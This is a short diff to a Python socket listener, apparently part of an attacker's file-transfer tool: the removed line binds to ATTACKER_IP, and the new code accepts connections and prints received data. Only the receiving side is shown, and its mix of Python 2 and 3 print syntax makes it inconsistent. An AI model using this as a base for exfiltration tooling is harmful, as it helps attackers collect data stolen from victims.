@@ -20,12 +20,20 @@ def send_file(file_name):
 
 def listen_for_file():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.bind((ATTACKER_IP, FILE_TRANSFER_PORT))
+    host = socket.gethostname()
+    print (host)
+    s.bind((host, FILE_TRANSFER_PORT))
     s.listen(5)
-    data = s.recv(4096)
-    print data
     while 1:
-        data = s.recv(4096)
+        print ("in while loop")
+        conn, addr = s.accept()
+        print (addr)
+        data = conn.recv(4096)
         print data
-    s.close()
+        while 1:
+            data = conn.recv(4096)
+            if not data:
+                break
+            print data
+        # s.close()
 
